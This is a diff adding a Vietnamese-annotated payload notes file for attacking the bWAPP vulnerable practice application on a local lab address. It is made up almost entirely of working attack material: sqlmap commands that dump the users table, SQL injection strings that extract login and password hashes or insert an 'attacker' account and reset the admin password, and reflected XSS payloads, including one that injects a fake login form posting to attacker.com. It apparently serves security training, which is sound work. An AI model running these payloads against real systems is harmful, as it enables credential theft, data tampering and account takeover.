@@ -1,0 +1,107 @@
+1***========sql injection get_search
+* với sqmap: lệnh để thực hiện lấy thông tin, đổi PHPSESSID
+1. sqlmap -u "http://192.168.10.10/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=vgvorcoshek1q178tcsrg8a595; security_level=0" -p title --dbs
+2. sqlmap -u "http://192.168.10.10/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=vgvorcoshek1q178tcsrg8a595; security_level=0" -p title --users
+3. sqlmap -u "http://192.168.10.10/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=vgvorcoshek1q178tcsrg8a595; security_level=0" -p title -D bWAPP --tables
+4. sqlmap -u "http://192.168.10.10/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=vgvorcoshek1q178tcsrg8a595; security_level=0" -p title -D bWAPP -T users --columns
+5. sqlmap -u "http://192.168.10.10/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=vgvorcoshek1q178tcsrg8a595; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
+* chạy:
+    "lam' or 1=1 #",
+    "lam' union select 1,user(),3,4,5,6,7 #",
+    "lam' union select 1,user(), database(),4,5,6,7 #",
+    "lam' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #",
+    "lam' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #",
+    "lam 'order by 1#",
+    "uyen' union select 1, (select GROUP_CONCAT(column_name,'\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #"
+* huấn luyện
+    "lam' UNION SELECT null, null, null, null, null, null, null-- -",
+    "lam' UNION SELECT 1,2,3,4,5,6,7-- -",
+    "lam' UNION SELECT 1, user(), database(), version(), 5, 6, 7-- -",
+    "lam' UNION SELECT 1, table_name, null, null, null, null, null FROM information_schema.tables-- -",
+    "lam' UNION SELECT 1, column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name='users'-- -",
+    "lam' UNION SELECT 1, login, password, null, null, null, null FROM users-- -",
+    "lam' OR 1=1-- -",
+    "lam' OR 1=1#",
+    "lam' AND 1=2 UNION SELECT 1, user(), database(), version(), null, null, null-- -",
+    "lam' AND 1=2 UNION SELECT 1, CONCAT_WS(':', user(), database()), null, null, null, null, null-- -",
+    "lam' AND updatexml(1, concat(0x3a, (SELECT @@version)), 1)-- -",
+    "lam' AND IF(1=1, SLEEP(5), 0)-- -",
+    "lam' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)-- -",
+    "lam'; INSERT INTO users (username, password) VALUES ('attacker', 'password');-- -",
+    "lam'; SELECT * FROM users;-- -",
+    "lam'; UPDATE users SET password = 'newpass' WHERE login = 'admin';-- -",
+    "lam' ORDER BY 1-- -",
+    "lam' ORDER BY 2-- -",
+    "lam' GROUP BY login-- -",
+    "lam' UNION SELECT 1,2,3,4,5,6,7 ORDER BY 1-- -",
+    "iron' union select 1,2,3,4,5,6,7– –",
+    "' order by 6 -- -",
+    "' and 1=0 union all select 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' -- -",
+    "' and 1=0 union all select 1,table_name, column_name,4,5,6,7 from information_schema.columns where table_schema != 'mysql' and table_schema != 'information_schema' and table_schema='bWAPP' and table_name='users' -- -",
+    "' and 1=0 union all select 1,login,password,secret,email,admin,7 from users-- -",
+    "a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--"
+2***========sql injection get_select
+* chạy:
+    "http://192.168.10.10:80/sqli_2.php?movie=2&action=go' or 1=1",
+    "http://192.168.10.10:80/sqli_2.php?movie=2' or 1=1&action=go",
+    "http://192.168.10.10:80/sqli_2.php?movie=100 union select 1, 2,3,4,5,6,7 #&action=go",
+    "http://192.168.10.10:80/sqli_2.php?movie=100 union select 1, (SELECT GROUP_CONCAT(table_name, '---') FROM information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #&action=go",
+    "http://192.168.10.10:80/sqli_2.php?movie=100 union select 1, (select GROUP_CONCAT(column_name,'\\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #&action=go",
+    "http://192.168.10.10:80/sqli_2.php?movie=100 UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #&action=go"
+* huấn luyện
+    'http://192.168.10.10:80/sqli_2.php?movie=1 order by 1-- &action=go',
+    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,2,3,4,5,6,7--&action=go',
+    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,database(),3,4,5,6,7--&action=go',
+    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,version(),3,4,5,6,7--&action=go',
+    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,version(),@@version,4,5,6,7--&action=go',
+    'http://192.168.10.10:80/sqli_2.php?movie=3%20order%20by%207%20&action=go',
+    'http://192.168.10.10:80/sqli_2.php?movie=3%20AND%201=0%20union%20select%201,@@version,3,4,5,6,7%20&action=go',
+    "http://192.168.10.10:80/sqli_2.php?movie=2' and 1=2 -- &action=go"
+3***========sql injection(AJAX\JSON\jQuery)
+* chạy:
+    "uyen ' union select 1,2,3,4,5,6,7 #",
+    "uyen ' union select 1, user(),3,4,5,6,7 #",
+    "uyen ' union select 1, (select GROUP_CONCAT(table_name,'\\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #",
+    "uyen ' union select 1, (select GROUP_CONCAT(column_name,'\\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #",
+    "uyen' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #"
+* huấn luyện
+    "'order by 7 -- -",
+    "'order by 8 -- -",
+    "' union select 1,version(),3,4,database(),6,7 -- #",
+    "uyen' AND (SELECT IF((SELECT LENGTH(user()) > 10), SLEEP(5), 0)) #",
+    "uyen ' union select 1, version(),3,4,5,6,7 #",
+    "uyen ' union select 1, (select group_concat(grant_priv) from mysql.user where user = 'root'), 3,4,5,6,7 #",
+    "uyen%20'%20union%20select%201,2,3,4,5,6,7%20--%20",
+    "uyen ' union select 1, (select login from users where id = 1), (select password from users where id = 1), 4,5,6,7 #"
+4***========XSS - Reflected (GET)
+* chạy:
+    "<script>alert(document.cookie)</script>"
+* huấn luyện
+    "<h1 style=\"color: red;\">Hacked by XSS</h1>",
+    "<img src=\"#\" onmouseover=\"alert('XSS via onmouseover')\">",
+    "<script>window.location='http://malicious-site.com'</script>",
+    "<iframe src=\"http://malicious-site.com\" width=\"400\" height=\"300\"></iframe>",
+    "<img src=\"http://malicious-site.com/image.jpg\" onerror=\"alert('XSS')\">",
+    "<script>document.body.innerHTML = \"<h1>Hacked by XSS</h1>\";</script>",
+    "<script>document.write(document.location.href)</script>"
+5***========XSS - Reflected (POST)
+* chạy:
+    "<script>alert(document.cookie)</script>"
+* huấn luyện
+    '<h1 style="color:red;">This is a Hacked Title!</h1>',
+    '<img src="#" onmouseover="alert(\'XSS via onmouseover\')">',
+    '<button onclick="alert(\'Button Clicked!\')">Click Me!</button>',
+    '<script>document.body.innerHTML = "<h1>Page Hacked by XSS</h1>";</script>',
+    '<script>document.write(\'Hacked via DOM-based XSS\')</script>'
+
+6***=======XSS - Reflected (JSON)
+* chạy:
+    "\"}]}';alert(document.cookie)</script>"
+* huấn luyện
+    "\"}]}';prompt(0)</script>",
+    "\"}]}';<img src=x onload=alert('XSS')>//",
+    "\"}]}';<button onclick=alert('XSS via onclick')>Click me</button>//",
+    "\"}]}';<script>window.location='http://malicious-site.com';</script>//",
+    "\"}]}';<form action='http://attacker.com/login.php' method='POST'><input type='text' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>//",
+    "\"}]}';<img src='#' onmouseover='alert(\"XSS\")'>//",
+    "\"}]}';<script>document.body.innerHTML='<h1>Hacked by XSS</h1>';</script>//"
